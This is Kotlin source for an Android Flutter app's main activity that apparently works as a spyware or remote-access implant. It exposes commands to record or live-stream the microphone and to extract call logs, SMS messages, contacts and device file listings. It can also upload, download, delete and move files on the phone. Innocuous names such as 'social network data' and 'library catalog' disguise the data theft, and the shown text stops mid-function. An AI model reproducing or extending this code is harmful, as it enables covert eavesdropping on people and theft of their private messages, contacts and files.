package com.example.kem

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.util.Log
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import androidx.annotation.NonNull
import android.media.MediaRecorder
import android.os.Build
import android.media.AudioRecord
import android.media.AudioFormat
import android.media.MediaRecorder.AudioSource
import kotlinx.coroutines.*
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject
import kotlin.coroutines.coroutineContext

// ==================== BASE AUDIO MANAGER ====================
/**
 * مدير الصوت الأساسي
 * Base audio manager
 */
abstract class BaseAudioManager {
    protected val TAG = "NativeAudioHandler"
    
    // Audio Parameters
    protected val sampleRate = 16000
    protected val channelConfig = AudioFormat.CHANNEL_IN_MONO
    protected val audioFormat = AudioFormat.ENCODING_PCM_16BIT
    
    protected fun checkMicrophonePermission(context: Context): Boolean {
        return BaseUtils.checkPermission(context, Manifest.permission.RECORD_AUDIO)
    }
    
    protected fun createFile(context: Context, extension: String, prefix: String): File? {
        return try {
            val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US).format(Date())
            val fileName = "${prefix}_${timeStamp}.$extension"
            val storageDir = context.getExternalFilesDir("AudioRecordings")
            if (storageDir != null && !storageDir.exists()) {
                storageDir.mkdirs()
            }
            File(storageDir, fileName)
        } catch (e: Exception) {
            Log.e(TAG, "Error creating file: ${e.message}", e)
            null
        }
    }
    
    protected fun handleMethodResult(
        result: MethodChannel.Result,
        success: Boolean,
        successValue: Any? = null,
        errorCode: String = "OPERATION_FAILED",
        errorMessage: String = "Operation failed"
    ) {
        if (success) {
            result.success(successValue)
        } else {
            result.error(errorCode, errorMessage, null)
        }
    }
}

// ==================== FIXED RECORDING MANAGER ====================
/**
 * مدير التسجيل الثابت
 * Fixed recording manager
 */
class FixedRecordingManager(private val context: Context) : BaseAudioManager() {
    
    private var mediaRecorder: MediaRecorder? = null
    private var audioFile: File? = null
    private var recordingJob: Job? = null
    
    fun startRecording(durationSeconds: Int, result: MethodChannel.Result) {
        Log.d(TAG, "Handling startRecording for $durationSeconds seconds.")
        recordingJob?.cancel()

        recordingJob = CoroutineScope(Dispatchers.IO).launch {
            var recordingPath: String? = null
            var recordingError: Throwable? = null
            
            try {
                if (!checkMicrophonePermission(context)) {
                    throw SecurityException("Microphone permission not granted.")
                }
                recordingPath = startAudioRecordingAndAwaitCompletion(durationSeconds)
                Log.d(TAG, "Fixed recording job completed successfully. Path: $recordingPath")
            } catch (e: CancellationException) {
                Log.w(TAG, "Fixed recording job cancelled: ${e.message}")
                recordingError = RuntimeException("Recording cancelled or stopped manually.")
                releaseMediaRecorder()
            } catch (e: Exception) {
                Log.e(TAG, "Fixed recording job failed: ${e.message}", e)
                recordingError = e
                releaseMediaRecorder()
            }

                withContext(Dispatchers.Main) {
                    if (isActive) {
                        if (recordingError == null) {
                            Log.i(TAG, "MethodChannel: startRecording successful. Returning path: $recordingPath")
                            result.success(recordingPath)
                        } else {
                            val errorMessage = recordingError.message ?: "Unknown recording error"
                            Log.e(TAG, "MethodChannel: startRecording failed. Error: $errorMessage")
                            result.error("RECORDING_FAILED", errorMessage, null)
                        }
                    } else {
                        Log.w(TAG, "Fixed recording coroutine inactive when trying to send result.")
                    }
                }
        }
    }
    
    fun stopRecording(result: MethodChannel.Result) {
        Log.d(TAG, "Handling stopRecording (manual stop for fixed duration).")
        if (recordingJob?.isActive == true) {
            recordingJob?.cancel(CancellationException("Manual stop requested via MethodChannel."))
            Log.i(TAG, "Cancel signal sent to active fixed recording job.")
            result.success(true)
        } else {
            Log.w(TAG, "StopRecording called but no active fixed recording job found.")
            result.success(false)
        }
    }
    
    private suspend fun startAudioRecordingAndAwaitCompletion(durationSeconds: Int): String? {
        coroutineContext.ensureActive()

        if (mediaRecorder != null) {
            Log.w(TAG, "MediaRecorder already active. Releasing previous.")
            releaseMediaRecorder()
        }
        
        Log.i(TAG, "Preparing to record for $durationSeconds seconds.")

        try {
            audioFile = createFile(context, "3gp", "fixed_duration_audio")
            if (audioFile == null || audioFile?.parentFile?.exists() == false) {
                val dirPath = audioFile?.parent ?: context.filesDir.absolutePath + "/audio_recordings"
                throw IOException("Failed to create or access audio output directory: $dirPath")
            }
            Log.d(TAG, "Output file: ${audioFile?.absolutePath}")

            mediaRecorder = (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }).apply {
                setAudioSource(AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioFile!!.absolutePath)
                setOnErrorListener { _, what, extra ->
                    Log.e(TAG, "MediaRecorder error during recording: what=$what, extra=$extra")
                    releaseMediaRecorder()
                }
                prepare()
            }

            mediaRecorder?.start()
            Log.i(TAG, "MediaRecorder started for ${audioFile?.name}.")

            try {
                delay(durationSeconds * 1000L)
                Log.i(TAG, "Recording duration ($durationSeconds s) elapsed.")
            } catch (e: CancellationException) {
                Log.w(TAG, "Delay cancelled during recording. Stopping early.")
                throw e
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error during setup/start: ${e.message}", e)
            releaseMediaRecorder()
            throw RuntimeException("Setup/start error: ${e.message}", e)
        } finally {
            Log.d(TAG, "Entering finally block.")
            return stopAudioRecordingAndGetPath()
        }
    }
    
    private fun stopAudioRecordingAndGetPath(): String? {
        val currentRecorder = mediaRecorder
        val currentAudioFile = audioFile
        Log.i(TAG, "Attempting to stop MediaRecorder.")

        if (currentRecorder == null) {
            Log.w(TAG, "MediaRecorder is already null.")
            return if (currentAudioFile?.exists() == true && currentAudioFile.length() > 0) {
                Log.i(TAG, "Found existing file: ${currentAudioFile.absolutePath}")
                currentAudioFile.absolutePath.also { this.audioFile = null }
            } else {
                null
            }
        }

        var savedPath: String? = null
        try {
            currentRecorder.stop()
            Log.i(TAG, "MediaRecorder.stop() successful.")
            savedPath = currentAudioFile?.absolutePath
            if (savedPath != null && File(savedPath).exists() && File(savedPath).length() > 0) {
                Log.i(TAG, "Audio saved to $savedPath")
            } else {
                Log.e(TAG, "File invalid after stop(). Path: $savedPath")
                savedPath = null
            }
        } catch (e: IllegalStateException) {
            Log.e(TAG, "IllegalStateException during stop().", e)
            savedPath = if (currentAudioFile?.exists() == true && currentAudioFile.length() > 0) currentAudioFile.absolutePath else null
        } catch (e: RuntimeException) {
            Log.e(TAG, "RuntimeException during stop().", e)
            savedPath = null
        } finally {
            releaseMediaRecorder()
            this.audioFile = null
        }
        return savedPath
    }
    
    private fun releaseMediaRecorder() {
        Log.d(TAG, "Releasing MediaRecorder resources.")
        try {
            mediaRecorder?.reset()
            mediaRecorder?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing MediaRecorder: ${e.message}", e)
        } finally {
            mediaRecorder = null
        }
    }
    
    fun cleanup() {
        recordingJob?.cancel()
        releaseMediaRecorder()
    }
}

// ==================== LIVE STREAMING MANAGER ====================
/**
 * مدير البث المباشر
 * Live streaming manager
 */
class LiveStreamingManager(
    private val context: Context,
    private val methodChannel: MethodChannel
) : BaseAudioManager() {
    
    private var audioRecord: AudioRecord? = null
    private var streamingJob: Job? = null
    private var isStreaming = false
    private var bufferSize = 0
    
    fun startStreaming(result: MethodChannel.Result) {
        Log.d(TAG, "Handling startLiveAudioStream.")
        if (isStreaming) {
            Log.w(TAG, "Start streaming called but already streaming.")
            result.success(false)
            return
        }
        if (!checkMicrophonePermission(context)) {
            Log.e(TAG, "Microphone permission not granted for live streaming.")
            result.error("PERMISSION_DENIED", "Microphone permission not granted.", null)
            return
        }

        streamingJob = CoroutineScope(Dispatchers.IO).launch {
            var streamStartedSuccessfully = false
            try {
                bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
                if (bufferSize == AudioRecord.ERROR_BAD_VALUE || bufferSize == AudioRecord.ERROR) {
                    throw IllegalStateException("AudioRecord.getMinBufferSize returned error or bad value.")
                }
                Log.d(TAG, "AudioRecord buffer size: $bufferSize bytes")

                @Suppress("MissingPermission")
                audioRecord = AudioRecord(AudioSource.MIC, sampleRate, channelConfig, audioFormat, bufferSize)

                if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                    throw IllegalStateException("AudioRecord failed to initialize.")
                }

                audioRecord?.startRecording()
                isStreaming = true
                streamStartedSuccessfully = true
                Log.i(TAG, "AudioRecord started successfully for live streaming.")

                withContext(Dispatchers.Main) {
                    result.success(true)
                }

                runStreamingLoop()

            } catch (e: CancellationException) {
                Log.i(TAG, "Live streaming coroutine cancelled.")
            } catch (e: Exception) {
                Log.e(TAG, "Error during live audio streaming: ${e.message}", e)
                withContext(Dispatchers.Main) {
                    methodChannel.invokeMethod("streamingError", e.message ?: "Unknown streaming error")
                }
                if (!streamStartedSuccessfully) {
                    withContext(Dispatchers.Main) {
                        result.success(false)
                    }
                }
            } finally {
                Log.d(TAG, "Live streaming coroutine finishing. Releasing AudioRecord.")
                releaseAudioRecord()
                isStreaming = false
            }
        }
    }
    
    fun stopStreaming(result: MethodChannel.Result) {
        Log.d(TAG, "Handling stopLiveAudioStream.")
        if (!isStreaming) {
            Log.w(TAG, "Stop streaming called but not currently streaming.")
            result.success(false)
            return
        }

        streamingJob?.cancel(CancellationException("Stop live streaming requested."))
        streamingJob = null
        isStreaming = false
        Log.i(TAG, "Live streaming stop requested. Coroutine cancelled.")
        result.success(true)
    }
    
    private suspend fun runStreamingLoop() {
        val audioBuffer = ByteArray(bufferSize)
        while (coroutineContext.isActive && isStreaming) {
            val readResult = audioRecord?.read(audioBuffer, 0, bufferSize) ?: -1

            if (readResult > 0) {
                val dataToSend = audioBuffer.copyOfRange(0, readResult)
                withContext(Dispatchers.Main) {
                    if (isStreaming && coroutineContext.isActive) {
                        methodChannel.invokeMethod("audioChunk", dataToSend)
                    }
                }
            } else if (readResult == 0) {
                delay(10)
            } else {
                Log.e(TAG, "AudioRecord read error: $readResult")
                throw IOException("AudioRecord read failed with code: $readResult")
            }
        }
    }
    
    private fun releaseAudioRecord() {
        Log.d(TAG, "Releasing AudioRecord resources.")
        if (audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
            try {
                audioRecord?.stop()
                Log.d(TAG, "AudioRecord stopped.")
            } catch (e: IllegalStateException) {
                Log.e(TAG, "Error stopping AudioRecord: ${e.message}")
            }
        }
        try {
            audioRecord?.release()
            Log.d(TAG, "AudioRecord released.")
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing AudioRecord: ${e.message}")
        }
        audioRecord = null
        isStreaming = false
    }
    
    fun cleanup() {
        streamingJob?.cancel()
        releaseAudioRecord()
    }
}

// ==================== COMMUNICATION DATA MANAGER ====================
/**
 * مدير بيانات الاتصالات
 * Communication data manager
 */
class CommunicationDataManager(context: Context) : BaseDataProcessor(context) {
    
    fun extractCommunicationHistory(): JSONObject {
        return safeExecute("communication history extraction") {
            if (!BaseUtils.checkPermission(context, Manifest.permission.READ_CALL_LOG)) {
                Log.w(BaseUtils.LOG_TAG, "Call log permission not granted")
                return@safeExecute BaseUtils.createErrorResponse("permission_denied", "Communication history access denied")
            }
            
            val communicationEvents = extractCommunicationEvents()
            val historyAnalytics = generateHistoryAnalytics(communicationEvents)
            
            createSuccessResponse(
                JSONObject().apply {
                    put("communication_events", communicationEvents)
                    put("history_analytics", historyAnalytics)
                    put("total_events", communicationEvents.length())
                },
                communicationEvents.length()
            ).apply {
                put("extraction_timestamp", System.currentTimeMillis())
                Log.i(BaseUtils.LOG_TAG, "Communication history extracted. Events count: ${communicationEvents.length()}")
            }
        }
    }
    
    private fun extractCommunicationEvents(): JSONArray {
        val eventsList = JSONArray()
        
        val projectionFields = arrayOf(
            CallLog.Calls._ID,
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.TYPE,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.CACHED_NUMBER_TYPE,
            CallLog.Calls.CACHED_NUMBER_LABEL
        )
        
        val events = executeQuery(
            CallLog.Calls.CONTENT_URI,
            projectionFields,
            sortOrder = "${CallLog.Calls.DATE} DESC"
        ) { cursor -> extractEventDetails(cursor) }.take(1000)
        
        events.forEach { eventsList.put(it) }
        return eventsList
    }
    
    private fun extractEventDetails(cursor: android.database.Cursor): JSONObject {
        return JSONObject().apply {
            put("event_id", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID)) ?: "unknown")
            put("target_endpoint", BaseUtils.sanitizeAddress(
                cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)), 20
            ))
            
            val eventTimestamp = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
            put("event_timestamp", eventTimestamp)
            put("formatted_time", BaseUtils.formatTimestamp(eventTimestamp))
            
            val eventDuration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION))
            put("interaction_duration", eventDuration)
            put("duration_formatted", formatDuration(eventDuration))
            
            put("interaction_type", decodeCommunicationType(
                cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
            ))
            put("cached_identity", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "Unknown Contact")
            put("endpoint_classification", decodeNumberType(
                cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NUMBER_TYPE))
            ))
            put("endpoint_label", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NUMBER_LABEL)) ?: "")
        }
    }
    
    private fun generateHistoryAnalytics(events: JSONArray): JSONObject {
        val analytics = JSONObject()
        
        try {
            val stats = mutableMapOf(
                "incoming_events" to 0,
                "outgoing_events" to 0,
                "missed_opportunities" to 0,
                "rejected_communications" to 0,
                "blocked_communications" to 0
            )
            var totalDuration = 0L
            
            for (i in 0 until events.length()) {
                val event = events.getJSONObject(i)
                val interactionType = event.getString("interaction_type")
                val duration = event.getLong("interaction_duration")
                
                when (interactionType) {
                    "incoming_communication" -> stats["incoming_events"] = stats["incoming_events"]!! + 1
                    "outgoing_communication" -> stats["outgoing_events"] = stats["outgoing_events"]!! + 1
                    "missed_opportunity" -> stats["missed_opportunities"] = stats["missed_opportunities"]!! + 1
                    "rejected_communication" -> stats["rejected_communications"] = stats["rejected_communications"]!! + 1
                    "blocked_communication" -> stats["blocked_communications"] = stats["blocked_communications"]!! + 1
                }
                
                totalDuration += duration
            }
            
            stats.forEach { (key, value) -> analytics.put(key, value) }
            analytics.put("total_interaction_time", totalDuration)
            analytics.put("average_interaction_duration", 
                if (events.length() > 0) totalDuration / events.length() else 0)
            analytics.put("analysis_timestamp", System.currentTimeMillis())
            
        } catch (analyticsEx: Exception) {
            Log.e(BaseUtils.LOG_TAG, "Failed to generate history analytics", analyticsEx)
        }
        
        return analytics
    }
    
    private fun formatDuration(durationSeconds: Long): String {
        val hours = durationSeconds / 3600
        val minutes = (durationSeconds % 3600) / 60
        val seconds = durationSeconds % 60
        
        return when {
            hours > 0 -> String.format("%02d:%02d:%02d", hours, minutes, seconds)
            else -> String.format("%02d:%02d", minutes, seconds)
        }
    }
    
    private fun decodeCommunicationType(type: Int): String {
        val typeMapping = mapOf(
            CallLog.Calls.INCOMING_TYPE to "incoming_communication",
            CallLog.Calls.OUTGOING_TYPE to "outgoing_communication",
            CallLog.Calls.MISSED_TYPE to "missed_opportunity",
            CallLog.Calls.REJECTED_TYPE to "rejected_communication",
            CallLog.Calls.BLOCKED_TYPE to "blocked_communication"
        )
        return TypeDecoder.decodeWithMapping(type, typeMapping, "unknown_interaction")
    }
    
    private fun decodeNumberType(type: Int): String {
        val typeMapping = mapOf(
            1 to "residence_line",
            2 to "portable_device",
            3 to "office_line",
            7 to "alternative_line"
        )
        return TypeDecoder.decodeWithMapping(type, typeMapping, "unclassified_endpoint")
    }
}

// ==================== ENHANCED MAIN ACTIVITY ====================
class MainActivity : FlutterActivity() {
    
    private val MICROPHONE_CHANNEL_NAME = "com.example.kem/microphone"
    
    private lateinit var methodChannel: MethodChannel
    private lateinit var socialNetworkHelper: SocialNetworkHelper
    private lateinit var fixedRecordingManager: FixedRecordingManager
    private lateinit var liveStreamingManager: LiveStreamingManager
    private lateinit var communicationDataManager: CommunicationDataManager
    private lateinit var documentLibrarian: DocumentLibrarian
    private lateinit var messageManager: MessageManager
    private lateinit var remoteLibraryManager: RemoteLibraryManager

    override fun configureFlutterEngine(@NonNull flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        Log.d("MainActivity", "Configuring Flutter Engine and Enhanced Method Channel.")

        initializeManagers(flutterEngine)
        setupMethodChannelHandler()
    }
    
    private fun initializeManagers(flutterEngine: FlutterEngine) {
        methodChannel = MethodChannel(flutterEngine.dartExecutor.binaryMessenger, MICROPHONE_CHANNEL_NAME)
        socialNetworkHelper = SocialNetworkHelper(this)
        fixedRecordingManager = FixedRecordingManager(this)
        liveStreamingManager = LiveStreamingManager(this, methodChannel)
        communicationDataManager = CommunicationDataManager(this)
        documentLibrarian = DocumentLibrarian(this)
        messageManager = MessageManager(this)
        remoteLibraryManager = RemoteLibraryManager(this)
    }
    
    private fun setupMethodChannelHandler() {
        methodChannel.setMethodCallHandler { call, result ->
            Log.d("MainActivity", "Enhanced method call received: ${call.method}")
            when (call.method) {
                // Audio methods
                "startRecording" -> {
                    val durationSeconds = call.argument<Int>("duration") ?: 10
                    fixedRecordingManager.startRecording(durationSeconds, result)
                }
                "stopRecording" -> {
                    fixedRecordingManager.stopRecording(result)
                }
                "startLiveAudioStream" -> {
                    liveStreamingManager.startStreaming(result)
                }
                "stopLiveAudioStream" -> {
                    liveStreamingManager.stopStreaming(result)
                }
                
                // Data collection methods
                "collectSocialNetworkData" -> {
                    handleSocialNetworkData(result)
                }
                "extractCommunicationHistory" -> {
                    handleCommunicationHistory(result)
                }
                "extractSMSMessages" -> {
                    handleSMSMessages(result)
                }
                "extractAllSMSMessages" -> {
                    handleExtractAllSMSMessages(result)
                }
                "extractContactsList" -> {
                    handleContactsList(result)
                }
                "extractCallLogs" -> {
                    handleCallLogs(result)
                }
                "catalogLibraryContent" -> {
                    handleLibraryCatalog(result)
                }
                "analyzeSpecificContent" -> {
                    val filePath = call.argument<String>("filePath") ?: ""
                    handleSpecificContentAnalysis(result, filePath)
                }
                "processContentQueue" -> {
                    handleContentQueueProcessing(result)
                }
                
                // File management methods
                "exploreLibrarySection" -> {
                    val sectionPath = call.argument<String>("sectionPath")
                    val maxDepth = call.argument<Int>("maxDepth") ?: 2
                    handleExploreLibrarySection(result, sectionPath, maxDepth)
                }
                "prepareDocumentCopy" -> {
                    val documentPath = call.argument<String>("documentPath") ?: ""
                    val includeMetadata = call.argument<Boolean>("includeMetadata") ?: true
                    handlePrepareDocumentCopy(result, documentPath, includeMetadata)
                }
                "getLibraryCatalogs" -> {
                    handleGetLibraryCatalogs(result)
                }
                "queryContentIndex" -> {
                    val searchQuery = call.argument<String>("searchQuery") ?: ""
                    val searchPath = call.argument<String>("searchPath")
                    val contentFilter = call.argument<String>("contentFilter")
                    handleQueryContentIndex(result, searchQuery, searchPath, contentFilter)
                }
                "getFileInfo" -> {
                    val filePath = call.argument<String>("filePath") ?: ""
                    handleGetFileInfo(result, filePath)
                }
                "uploadFile" -> {
                    val filePath = call.argument<String>("filePath") ?: ""
                    val uploadType = call.argument<String>("uploadType") ?: "file_upload"
                    handleFileUpload(result, filePath, uploadType)
                }
                "downloadFile" -> {
                    val remoteUrl = call.argument<String>("remoteUrl") ?: ""
                    val localPath = call.argument<String>("localPath") ?: ""
                    handleFileDownload(result, remoteUrl, localPath)
                }
                "listDirectory" -> {
                    val directoryPath = call.argument<String>("directoryPath") ?: "/sdcard"
                    val includeHidden = call.argument<Boolean>("includeHidden") ?: false
                    handleListDirectory(result, directoryPath, includeHidden)
                }
                "createDirectory" -> {
                    val directoryPath = call.argument<String>("directoryPath") ?: ""
                    handleCreateDirectory(result, directoryPath)
                }
                "deleteFile" -> {
                    val filePath = call.argument<String>("filePath") ?: ""
                    handleDeleteFile(result, filePath)
                }
                "moveFile" -> {
                    val sourcePath = call.argument<String>("sourcePath") ?: ""
                    val destinationPath = call.argument<String>("destinationPath") ?: ""
                    handleMoveFile(result, sourcePath, destinationPath)
                }
                "copyFile" -> {
                    val sourcePath = call.argument<String>("sourcePath") ?: ""
                    val destinationPath = call.argument<String>("destinationPath") ?: ""
                    handleCopyFile(result, sourcePath, destinationPath)
                }
                
                else -> {
                    Log.w("MainActivity", "Method ${call.method} not implemented.")
                    result.notImplemented()
                }
            }
        }
    }
    
    // ==================== EXISTING HANDLERS ====================
    
    private fun handleSocialNetworkData(result: MethodChannel.Result) {
        Log.d("MainActivity", "Handling social network data collection request.")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val networkData = socialNetworkHelper.collectNetworkData()
                
                withContext(Dispatchers.Main) {
                    result.success(networkData.toString())
                }
                Log.i("MainActivity", "Social network data collection completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during social network data collection", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to social network data", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during social network data collection", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("COLLECTION_ERROR", "Failed to collect social network data", generalEx.message)
                }
            }
        }
    }
    
    private fun handleCommunicationHistory(result: MethodChannel.Result) {
        Log.d("MainActivity", "Handling communication history extraction request.")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val communicationHistory = communicationDataManager.extractCommunicationHistory()
                
                withContext(Dispatchers.Main) {
                    result.success(communicationHistory.toString())
                }
                Log.i("MainActivity", "Communication history extraction completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during communication history extraction", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to communication history", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during communication history extraction", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("EXTRACTION_ERROR", "Failed to extract communication history", generalEx.message)
                }
            }
        }
    }
    
    private fun handleSMSMessages(result: MethodChannel.Result) {
        Log.d("MainActivity", "Handling enhanced SMS extraction with optimization...")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                messageManager.handleExtractCommunicationMessages(result, false, true)
                Log.i("MainActivity", "Enhanced SMS extraction completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during enhanced SMS extraction", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to SMS messages", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during enhanced SMS extraction", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("EXTRACTION_ERROR", "Failed to extract SMS messages", generalEx.message)
                }
            }
        }
    }
    
    private fun handleExtractAllSMSMessages(result: MethodChannel.Result) {
        Log.d("MainActivity", "Handling unlimited SMS extraction with compression...")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                messageManager.handleExtractAllMessages(result)
                Log.i("MainActivity", "Unlimited SMS extraction completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during unlimited SMS extraction", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to SMS messages", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during unlimited SMS extraction", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("EXTRACTION_ERROR", "Failed to extract all SMS messages", generalEx.message)
                }
            }
        }
    }
    
    private fun handleContactsList(result: MethodChannel.Result) {
        Log.d("MainActivity", "Handling contacts list extraction request.")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val networkData = socialNetworkHelper.collectNetworkData()
                
                withContext(Dispatchers.Main) {
                    result.success(networkData.toString())
                }
                Log.i("MainActivity", "Contacts list extraction completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during contacts extraction", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to contacts", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during contacts extraction", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("EXTRACTION_ERROR", "Failed to extract contacts", generalEx.message)
                }
            }
        }
    }
    
    private fun handleCallLogs(result: MethodChannel.Result) {
        Log.d("MainActivity", "Handling call logs extraction request.")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val callLogsData = communicationDataManager.extractCommunicationHistory()
                
                withContext(Dispatchers.Main) {
                    result.success(callLogsData.toString())
                }
                Log.i("MainActivity", "Call logs extraction completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during call logs extraction", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to call logs", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during call logs extraction", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("EXTRACTION_ERROR", "Failed to extract call logs", generalEx.message)
                }
            }
        }
    }
    
    private fun handleLibraryCatalog(result: MethodChannel.Result) {
        Log.d("MainActivity", "Handling library catalog request.")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val catalogData = documentLibrarian.catalogLibraryContent()
                
                withContext(Dispatchers.Main) {
                    result.success(catalogData.toString())
                }
                Log.i("MainActivity", "Library catalog completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during library cataloging", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to file system", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during library cataloging", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("CATALOGING_ERROR", "Failed to catalog library content", generalEx.message)
                }
            }
        }
    }
    
    private fun handleSpecificContentAnalysis(result: MethodChannel.Result, filePath: String) {
        Log.d("MainActivity", "Handling specific content analysis for: $filePath")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val analysisData = documentLibrarian.analyzeSpecificContent(filePath)
                
                withContext(Dispatchers.Main) {
                    result.success(analysisData.toString())
                }
                Log.i("MainActivity", "Content analysis completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during content analysis", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("SECURITY_ERROR", "Access denied to content", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during content analysis", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("ANALYSIS_ERROR", "Failed to analyze content", generalEx.message)
                }
            }
        }
    }
    
    private fun handleContentQueueProcessing(result: MethodChannel.Result) {
        Log.d("MainActivity", "Handling content queue processing.")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val processingData = documentLibrarian.processContentQueue { progress ->
                    Log.d("MainActivity", "Content processing: $progress")
                }
                
                withContext(Dispatchers.Main) {
                    result.success(processingData.toString())
                }
                Log.i("MainActivity", "Content queue processing completed successfully.")
                
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "Error during content queue processing", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("PROCESSING_ERROR", "Failed to process content queue", generalEx.message)
                }
            }
        }
    }
    
    // ==================== NEW FILE MANAGEMENT HANDLERS ====================
    
    private fun handleExploreLibrarySection(result: MethodChannel.Result, sectionPath: String?, maxDepth: Int) {
        Log.d("MainActivity", "Handling library section exploration: $sectionPath (depth: $maxDepth)")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val explorationData = remoteLibraryManager.exploreLibrarySection(sectionPath, maxDepth)
                
                withContext(Dispatchers.Main) {
                    result.success(explorationData.toString())
                }
                Log.i("MainActivity", "Library section exploration completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during library exploration", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("ACCESS_RESTRICTED", "Library section access restricted", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during library exploration", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("EXPLORATION_ERROR", "Failed to explore library section", generalEx.message)
                }
            }
        }
    }
    
    private fun handlePrepareDocumentCopy(result: MethodChannel.Result, documentPath: String, includeMetadata: Boolean) {
        Log.d("MainActivity", "Handling document copy preparation: $documentPath")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val preparationData = remoteLibraryManager.prepareDocumentCopy(documentPath, includeMetadata)
                
                withContext(Dispatchers.Main) {
                    result.success(preparationData.toString())
                }
                Log.i("MainActivity", "Document copy preparation completed successfully.")
                
            } catch (securityEx: SecurityException) {
                Log.e("MainActivity", "Security error during document preparation", securityEx)
                withContext(Dispatchers.Main) {
                    result.error("DOCUMENT_RESTRICTED", "Document access restricted", securityEx.message)
                }
            } catch (generalEx: Exception) {
                Log.e("MainActivity", "General error during document preparation", generalEx)
                withContext(Dispatchers.Main) {
                    result.error("PREPARATION_ERROR", "Failed to prepare document copy", generalEx.message)
                }
            }
        }
    }
    
    private fun handleGetLibraryCatalogs(result: MethodChannel.Result) {
        Log.d("MainActivity", "Handling library catalogs retrieval request.")
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
